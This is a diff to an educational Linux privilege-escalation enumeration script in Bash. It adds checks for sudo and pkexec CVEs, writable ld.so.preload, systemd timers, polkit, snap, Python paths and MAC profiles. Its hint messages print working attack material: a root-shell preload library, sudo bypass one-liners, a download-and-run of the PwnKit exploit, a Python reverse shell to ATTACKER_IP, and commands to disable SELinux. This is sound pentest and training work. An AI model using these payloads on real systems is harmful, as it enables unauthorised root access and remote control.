@@ -234,7 +234,102 @@ enum_sudo() {
         teach "  Create malicious library, set LD_PRELOAD, run sudo command"
     fi
 }
+# === SUDO VERSION ANALYSIS ===
+enum_sudo_version() {
+    section "SUDO VERSION ANALYSIS"
+    
+    explain_concept "Sudo Vulnerabilities" \
+        "Sudo is complex software with a history of privilege escalation bugs. Version-specific CVEs can give instant root." \
+        "Sudo handles authentication, environment sanitization, and privilege transitions. Bugs in any of these areas = root access. Check sudo version against known CVEs." \
+        "Check version: sudo -V | head -1"
+    
+    if command -v sudo >/dev/null 2>&1; then
+        local sudo_version=$(sudo -V 2>/dev/null | head -1 | grep -oE '[0-9]+\.[0-9]+\.[0-9]+[a-z]?[0-9]*')
+        info "Sudo version: $sudo_version"
+        
+        if [ -z "$sudo_version" ]; then
+            warn "Could not determine sudo version"
+            return
+        fi
+        
+        # Parse version - handle formats like 1.9.15p5
+        local version_num=$(echo "$sudo_version" | sed 's/p.*//')
+        local major=$(echo "$version_num" | cut -d. -f1)
+        local minor=$(echo "$version_num" | cut -d. -f2)
+        local patch=$(echo "$version_num" | cut -d. -f3)
+        local p_version=$(echo "$sudo_version" | grep -oE 'p[0-9]+' | sed 's/p//')
+        
+        # CVE-2025-32463 (January 2025)
+        if [ "$major" -eq 1 ] && [ "$minor" -eq 9 ]; then
+            if [ "$patch" -lt 16 ] || ([ "$patch" -eq 16 ] && [ -n "$p_version" ] && [ "$p_version" -lt 1 ]); then
+                critical "Sudo vulnerable to CVE-2025-32463 - Privilege escalation"
+                vuln "sudo < 1.9.16p1 vulnerable"
+                teach "Exploit: https://www.exploit-db.com/exploits/52352"
+            fi
+        fi
+        
+        # CVE-2023-22809 - sudoedit bypass (1.8.0 to 1.9.12p1)
+        if [ "$major" -eq 1 ]; then
+            if [ "$minor" -eq 8 ] || ([ "$minor" -eq 9 ] && [ "$patch" -le 12 ]); then
+                critical "Sudo vulnerable to CVE-2023-22809 - sudoedit bypass"
+                vuln "sudo 1.8.0 - 1.9.12p1 vulnerable"
+                teach "Exploit: EDITOR='vim -- /etc/sudoers' sudoedit /etc/motd"
+            fi
+        fi
+        
+        # CVE-2021-3156 - Baron Samedit (< 1.9.5p2)
+        if [ "$major" -eq 1 ]; then
+            if [ "$minor" -lt 9 ] || ([ "$minor" -eq 9 ] && [ "$patch" -lt 5 ]); then
+                critical "Sudo vulnerable to Baron Samedit (CVE-2021-3156) - Heap overflow"
+                vuln "sudo < 1.9.5p2 vulnerable"
+                teach "Heap overflow exploit. Works on most distros."
+                teach "GitHub: https://github.com/blasty/CVE-2021-3156"
+            fi
+        fi
+        
+        # CVE-2019-14287 - Runas bypass (< 1.8.28)
+        if [ "$major" -eq 1 ] && [ "$minor" -eq 8 ] && [ "$patch" -lt 28 ]; then
+            critical "Sudo vulnerable to CVE-2019-14287 - User ID bypass"
+            vuln "sudo < 1.8.28 vulnerable"
+            teach "If allowed to run as ALL users except root: sudo -u#-1 /bin/bash"
+            teach "Requires sudoers entry like: (ALL, !root) NOPASSWD: /bin/bash"
+        fi
+        
+        # CVE-2019-18634 - pwfeedback overflow (1.7.1 to 1.8.30)
+        if [ "$major" -eq 1 ]; then
+            if ([ "$minor" -eq 7 ] && [ "$patch" -ge 1 ]) || ([ "$minor" -eq 8 ] && [ "$patch" -le 30 ]); then
+                warn "Sudo potentially vulnerable to CVE-2019-18634 - Buffer overflow"
+                info "Requires pwfeedback enabled in sudoers (uncommon)"
+                teach "Check: sudo -l and look for pwfeedback option"
+            fi
+        fi
+        # CVE-2023-42465 - Targeted corruption (1.9.12p2 to 1.9.15p4)
+        if [ "$major" -eq 1 ] && [ "$minor" -eq 9 ]; then
+            if ([ "$patch" -eq 12 ] && [ -n "$p_version" ] && [ "$p_version" -ge 2 ]) || 
+               ([ "$patch" -ge 13 ] && [ "$patch" -le 15 ] && ([ -z "$p_version" ] || [ "$p_version" -le 4 ])); then
+               warn "Sudo potentially vulnerable to CVE-2023-42465"
+                info "sudo 1.9.12p2 - 1.9.15p4"
+                teach "Requires specific sudoers configuration with SETENV"
+                teach "Check: sudo -l | grep SETENV"
+            fi
+        fi
 
+        # CVE-2023-7038 - Passthrough flaw (1.9.13p2 to 1.9.15p4)  
+        if [ "$major" -eq 1 ] && [ "$minor" -eq 9 ]; then
+            if ([ "$patch" -eq 13 ] && [ -n "$p_version" ] && [ "$p_version" -ge 2 ]) ||
+               ([ "$patch" -eq 14 ]) ||
+               ([ "$patch" -eq 15 ] && ([ -z "$p_version" ] || [ "$p_version" -le 4 ])); then
+                warn "Sudo potentially vulnerable to CVE-2023-7038"
+               info "sudo 1.9.13p2 - 1.9.15p4"
+                teach "Passthrough environment variable flaw"
+                teach "Less common, requires specific configuration"
+            fi
+        fi
+        ok "Sudo version checked against known CVEs"
+    else
+        info "sudo not installed"
+    fi
+}
 # === SUID BINARY ANALYSIS ===
 enum_suid() {
     section "SUID BINARY ANALYSIS"
@@ -258,11 +353,16 @@ enum_suid() {
         "/usr/lib/snapd/snap-confine"
         "/usr/lib/policykit-1/polkit-agent-helper-1"
         "/usr/lib/eject/dmcrypt-get-device"
+        "/usr/bin/fusermount3" "/usr/bin/ntfs-3g"
+        "/usr/lib/chromium/chrome-sandbox" "/usr/share/codium/chrome-sandbox"
+        "/usr/lib/xorg/Xorg.wrap" "/usr/sbin/pppd" "/usr/sbin/exim4"
+        "/usr/libexec/xscreensaver/xscreensaver-auth"
     )
     
     local found_interesting=0
     
-    find / -perm -4000 -type f 2>/dev/null | while read suid_bin; do
+    find / \( -path "*/containers/storage/*" -o -path /proc -o -path /sys -o -path /dev \) -prune -o -perm -4000 -type f -print 2>/dev/null | while read suid_bin; do
+
         local is_legit=0
         
         for legit in "${legit_suid[@]}"; do
@@ -350,7 +450,7 @@ enum_sgid() {
         "Less common than SUID for privilege escalation, but if SGID binary is in 'shadow' or 'docker' group, it can be exploited." \
         "Look for SGID binaries in privileged groups, then analyze like SUID binaries."
     
-    find / -perm -2000 -type f 2>/dev/null | head -20 | while read sgid_bin; do
+        find / \( -path "*/containers/storage/*" -o -path /proc -o -path /sys -o -path /dev \) -prune -o -perm -2000 -type f -print 2>/dev/null | head -20 | while read sgid_bin; do
         local group=$(stat -c %G "$sgid_bin" 2>/dev/null)
         case $group in
             shadow|docker|disk|sudo)
@@ -1067,10 +1167,11 @@ enum_processes() {
         "Monitor with: watch -n 1 'ps aux'\nLook for: mysql -p, curl -u, ssh user@host, API tokens"
     
     info "Current processes (checking for credentials in command line):"
-    ps aux | grep -iE "password|passwd|pwd|token|key|secret|api" | grep -v "grep" | head -10 | while read line; do
-        warn "Potentially sensitive process: $line"
+    ps aux | grep -iE "password=|passwd=|-p |--password|token=|key=|secret=|api=" | grep -v "grep" | head -10 | while read line; do
+        warn "Potentially sensitive process:"
+        log "  $line"
+        log ""  # Add blank line between each process      
     done
-    
     # Check for tmux/screen sessions
     if command -v tmux >/dev/null 2>&1; then
         local sessions=$(tmux ls 2>/dev/null | wc -l)
@@ -1117,7 +1218,7 @@ enum_mail_logs() {
     done
     
     # Check home directory mail
-    find /home -name ".mail" -o -name "mail" -o -name "mbox" 2>/dev/null | while read mail; do
+    find /home \( -path "*/containers/storage/*" \) -prune -o \( -name ".mail" -o -name "mail" -o -name "mbox" \) -print 2>/dev/null | while read mail; do
         [ -r "$mail" ] && info "Found mail file: $mail"
     done
     
@@ -1658,7 +1759,7 @@ enum_groups() {
         "Groups exist to delegate specific privileges. Docker group = control containers as root. Disk group = read any file. LXD group = create privileged containers. Admins add users for convenience, not realizing the security implications." \
         "Dangerous groups and exploitation:\n  • docker: Mount host filesystem in container\n  • lxd/lxc: Create privileged container\n  • disk: Direct disk access bypasses permissions\n  • video: Capture framebuffer screenshots\n  • sudo: Obvious, but check for NOPASSWD"
     
-    local current_groups=$(id | grep -oE 'groups=[^)]+' | cut -d= -f2)
+    local current_groups=$(groups)
     info "Your groups: $current_groups"
     
     # Check for docker group
@@ -2345,7 +2446,268 @@ enum_wildcards() {
         fi
     done
 }
+# === WRITABLE LD.SO.PRELOAD ===
+enum_ld_preload() {
+    section "LD.SO.PRELOAD ANALYSIS"
+    
+    explain_concept "ld.so.preload File" \
+        "The /etc/ld.so.preload file forces the dynamic linker to load specified libraries before all others, for every program execution." \
+        "If writable, you can force your malicious library to load into every process that starts, including those running as root. This gives instant root access the next time any SUID binary or root process starts." \
+        "Exploitation:\n  1. Create malicious library: gcc -shared -fPIC -o /tmp/evil.so evil.c\n  2. Add to preload: echo '/tmp/evil.so' > /etc/ld.so.preload\n  3. Wait for or trigger any SUID binary execution\n  4. Your code runs as root"
+    
+    if [ -f /etc/ld.so.preload ]; then
+        if [ -w /etc/ld.so.preload ]; then
+            critical "ld.so.preload is WRITABLE - Instant root via library injection"
+            vuln "/etc/ld.so.preload is WRITABLE!"
+            teach "Malicious library template (evil.c):"
+            teach "  #include <stdio.h>"
+            teach "  #include <sys/types.h>"
+            teach "  #include <stdlib.h>"
+            teach "  void _init() {"
+            teach "      unsetenv(\"LD_PRELOAD\");"
+            teach "      setgid(0); setuid(0);"
+            teach "      system(\"/bin/bash -p\");"
+            teach "  }"
+            teach "Compile and inject: gcc -shared -fPIC -o /tmp/evil.so evil.c && echo '/tmp/evil.so' > /etc/ld.so.preload"
+        else
+            ok "/etc/ld.so.preload exists but not writable"
+        fi
+    else
+        ok "/etc/ld.so.preload does not exist"
+    fi
+    
+    # Check ld.so.conf.d directory
+    if [ -d /etc/ld.so.conf.d ]; then
+        if [ -w /etc/ld.so.conf.d ]; then
+            critical "ld.so.conf.d directory WRITABLE - Add malicious library paths"
+            vuln "/etc/ld.so.conf.d/ is WRITABLE!"
+            teach "Create config file pointing to your malicious library directory"
+            teach "  echo '/tmp' > /etc/ld.so.conf.d/evil.conf && ldconfig"
+        fi
+    fi
+}
 
+# === SYSTEMD TIMERS ===
+enum_systemd_timers() {
+    section "SYSTEMD TIMER ANALYSIS"
+    
+    explain_concept "Systemd Timers" \
+        "Systemd timers are the modern replacement for cron jobs. Like services, writable timer files running as root give you code execution." \
+        "Timers trigger service execution on a schedule. If you can modify a timer or its associated service that runs as root, you control what executes and when." \
+        "Exploitation:\n  1. Find writable timer: /etc/systemd/system/*.timer\n  2. Modify associated service's ExecStart\n  3. Or modify timer's OnCalendar to trigger immediately\n  4. systemctl daemon-reload && systemctl start timer-name"
+    
+    # Check for writable timer files
+    find /etc/systemd/system /lib/systemd/system -name "*.timer" -type f 2>/dev/null | while read timer; do
+        if [ -w "$timer" ] && [ ! -L "$timer" ]; then
+            critical "Writable systemd timer: $timer"
+            vuln "Writable systemd timer: $timer"
+            
+            # Find associated service
+            local service=$(grep "Unit=" "$timer" 2>/dev/null | cut -d= -f2)
+            if [ -n "$service" ]; then
+                info "  Associated service: $service"
+                if [ -w "/etc/systemd/system/$service" ] || [ -w "/lib/systemd/system/$service" ]; then
+                    critical "  Associated service is ALSO writable!"
+                fi
+            fi
+        fi
+    done
+    
+    # List active timers
+    if command -v systemctl >/dev/null 2>&1; then
+        local timer_count=$(systemctl list-timers --no-pager 2>/dev/null | grep -c "\.timer")
+        if [ $timer_count -gt 0 ]; then
+            info "Active timers: $timer_count"
+            teach "List all timers: systemctl list-timers"
+            teach "Check timer details: systemctl cat <timer-name>"
+        fi
+    fi
+}
+
+# === POLKIT/PKEXEC ===
+enum_polkit() {
+    section "POLKIT/PKEXEC ANALYSIS"
+    
+    explain_concept "Polkit (PolicyKit)" \
+        "Polkit allows unprivileged processes to communicate with privileged ones. pkexec is like sudo but uses polkit for authorization." \
+        "CVE-2021-4034 (PwnKit) was a critical vulnerability in pkexec. Even if patched, misconfigurations in polkit rules can grant unintended privileges." \
+        "Check:\n  â€¢ pkexec version (CVE-2021-4034 if < 0.120)\n  â€¢ Writable polkit rules in /etc/polkit-1/\n  â€¢ Custom actions in /usr/share/polkit-1/actions/"
+    
+    if command -v pkexec >/dev/null 2>&1; then
+        local pkexec_path=$(which pkexec)
+        info "pkexec found: $pkexec_path"
+        
+        # Check version for PwnKit
+        local version=$(pkexec --version 2>/dev/null | grep -oE '[0-9]+\.[0-9]+' | head -1)
+        if [ -n "$version" ]; then
+            info "pkexec version: $version"
+            
+            # Simple version comparison for 0.120
+            local major=$(echo "$version" | cut -d. -f1)
+            local minor=$(echo "$version" | cut -d. -f2)
+            
+            if [ "$major" -eq 0 ] && [ "$minor" -lt 120 ]; then
+                critical "pkexec vulnerable to PwnKit (CVE-2021-4034) - Instant root"
+                vuln "pkexec version $version is vulnerable to CVE-2021-4034!"
+                teach "PwnKit exploitation:"
+                teach "  wget https://github.com/ly4k/PwnKit/raw/main/PwnKit"
+                teach "  chmod +x PwnKit"
+                teach "  ./PwnKit"
+            else
+                ok "pkexec version appears patched for PwnKit"
+            fi
+        fi
+        
+        # Check polkit rules
+        if [ -d /etc/polkit-1/rules.d ]; then
+            find /etc/polkit-1/rules.d -name "*.rules" -type f 2>/dev/null | while read rule; do
+                if [ -w "$rule" ]; then
+                    critical "Writable polkit rule: $rule"
+                    vuln "Writable polkit rule: $rule"
+                    teach "Modify rule to grant yourself admin rights"
+                elif [ -r "$rule" ]; then
+                    # Check for permissive rules
+                    if grep -qE "return polkit.Result.YES" "$rule" 2>/dev/null; then
+                        warn "Permissive polkit rule found: $rule"
+                        info "Review this rule for privilege escalation opportunities"
+                    fi
+                fi
+            done
+        fi
+    else
+        ok "pkexec not installed"
+    fi
+}
+
+# === SNAP PACKAGES ===
+enum_snap() {
+    section "SNAP PACKAGE ANALYSIS"
+    
+    explain_concept "Snap Packages & Confinement" \
+        "Snap packages can run in different confinement modes. 'devmode' disables security, 'classic' has no isolation. These can be exploited." \
+        "Snaps in devmode or classic confinement have full system access. If you can modify snap applications or their data, you might execute code with fewer restrictions. Dirty_sock exploited snapd socket permissions." \
+        "Check:\n  â€¢ Snaps in devmode (snap list)\n  â€¢ Writable snap directories\n  â€¢ snapd socket permissions\n  â€¢ Dirty_sock vulnerability (CVE-2019-7304)"
+    
+    if command -v snap >/dev/null 2>&1; then
+        info "Snap is installed"
+        
+        # Check for devmode/classic snaps
+        snap list 2>/dev/null | grep -E "devmode|classic" | while read line; do
+            warn "Snap with relaxed confinement: $line"
+        done
+        
+        # Check snapd socket
+        if [ -S /run/snapd.socket ]; then
+            info "snapd socket exists: /run/snapd.socket"
+            
+            if [ -w /run/snapd.socket ]; then
+                critical "snapd socket is WRITABLE - Potential Dirty_sock exploit"
+                vuln "snapd socket is writable!"
+                teach "Check for Dirty_sock vulnerability (CVE-2019-7304)"
+                teach "  snapd versions < 2.37 vulnerable"
+            fi
+        fi
+        
+        # Check for writable snap directories
+        find /snap -maxdepth 2 -type d -writable 2>/dev/null | head -5 | while read dir; do
+            warn "Writable snap directory: $dir"
+        done
+    else
+        ok "Snap not installed"
+    fi
+}
+
+# === PYTHON LIBRARY PATH HIJACKING ===
+enum_python_paths() {
+    section "PYTHON LIBRARY PATH HIJACKING"
+    
+    explain_concept "Python Library Hijacking" \
+        "Python searches for modules in specific directories. If you can write to these paths, you can inject malicious modules that get imported by privileged scripts." \
+        "When Python imports a module, it searches sys.path in order. If an early directory is writable, you can place a malicious module there. If a root script imports it, your code runs as root." \
+        "Exploitation:\n  1. Find writable path: python3 -c 'import sys; print(sys.path)'\n  2. Identify module used by root script\n  3. Create malicious module in writable path\n  4. Wait for script execution"
+    
+    if command -v python3 >/dev/null 2>&1 || command -v python >/dev/null 2>&1; then
+        local python_cmd=$(command -v python3 2>/dev/null || command -v python 2>/dev/null)
+        
+        info "Python executable: $python_cmd"
+        
+        # Get Python paths
+        local python_paths=$($python_cmd -c "import sys; print('\n'.join(sys.path))" 2>/dev/null)
+        
+        info "Python module search paths:"
+        echo "$python_paths" | while read path; do
+            [ -z "$path" ] && continue
+            
+            if [ -d "$path" ]; then
+                if [ -w "$path" ]; then
+                    critical "WRITABLE Python path: $path - Hijack imports for privilege escalation"
+                    vuln "Writable Python library path: $path"
+                    teach "Create malicious module here that matches imports in root scripts"
+                    teach "Example malicious module (os.py):"
+                    teach "  import socket,subprocess,os"
+                    teach "  s=socket.socket(socket.AF_INET,socket.SOCK_STREAM)"
+                    teach "  s.connect(('ATTACKER_IP',4444))"
+                    teach "  os.dup2(s.fileno(),0)"
+                    teach "  os.dup2(s.fileno(),1)"
+                    teach "  os.dup2(s.fileno(),2)"
+                    teach "  subprocess.call(['/bin/sh','-i'])"
+                else
+                    log "  $path (not writable)"
+                fi
+            fi
+        done
+        
+        # Check PYTHONPATH
+        if [ -n "$PYTHONPATH" ]; then
+            info "PYTHONPATH is set: $PYTHONPATH"
+            echo "$PYTHONPATH" | tr ':' '\n' | while read path; do
+                if [ -w "$path" ]; then
+                    vuln "PYTHONPATH contains writable directory: $path"
+                fi
+            done
+        fi
+        
+        # Check for Python scripts run by root (in cron, etc.)
+        if [ -r /etc/crontab ]; then
+            if grep -E "\.py|python" /etc/crontab 2>/dev/null | grep -v "^#" | grep -q "."; then
+                warn "Python scripts in crontab - check their import statements"
+                grep -E "\.py|python" /etc/crontab 2>/dev/null | grep -v "^#" | while read line; do
+                    log "  $line"
+                done
+            fi
+        fi
+    fi
+}
+
+# === APPARMOR/SELINUX WRITABLE PROFILES ===
+enum_mac_writable() {
+    section "MAC PROFILE WRITABILITY"
+    
+    explain_concept "Writable MAC Profiles" \
+        "If AppArmor or SELinux profiles are writable, you can weaken security policies to allow previously blocked actions." \
+        "MAC policies restrict what programs can do. If you can modify these policies, you can remove restrictions on exploitable binaries or grant yourself new capabilities." \
+        "Exploitation:\n  AppArmor: Modify profile to complain mode or allow all\n  SELinux: Change file contexts or create permissive domains"
+    
+    # AppArmor profiles
+    if [ -d /etc/apparmor.d ]; then
+        find /etc/apparmor.d -name "*" -type f -writable 2>/dev/null | while read profile; do
+            critical "Writable AppArmor profile: $profile"
+            vuln "Writable AppArmor profile: $profile"
+            teach "Modify profile to complain mode or remove restrictions"
+            teach "  After modifying: apparmor_parser -r $profile"
+        done
+    fi
+    
+    # SELinux policies
+    if command -v semanage >/dev/null 2>&1; then
+        if [ -w /etc/selinux/config ]; then
+            critical "SELinux config WRITABLE: /etc/selinux/config"
+            vuln "/etc/selinux/config is writable!"
+            teach "Set SELINUX=permissive or SELINUX=disabled"
+            teach "  Requires reboot or: setenforce 0"
+        fi
+    fi
+}
 # === MAIN EXECUTION ===
 main() {
     cat << "EOF"
@@ -2387,10 +2749,12 @@ EOF
     
     # Permission-based vectors
     enum_sudo
+    enum_sudo_version
     enum_suid
     enum_sgid
     enum_writable_files
     enum_capabilities
+    enum_ld_preload
     
     # Group-based vectors
     enum_groups
@@ -2398,15 +2762,20 @@ EOF
     # Service-based vectors
     enum_cron
     enum_systemd
+    enum_systemd_timers
     
     # Kernel & container
     enum_kernel
     enum_kernel_modules
+    enum_polkit
+    enum_snap
     enum_container
     enum_mac
+    enum_mac_writable
     
     # Path & environment
     enum_path
+    enum_python_paths
     enum_env
     
     # File system
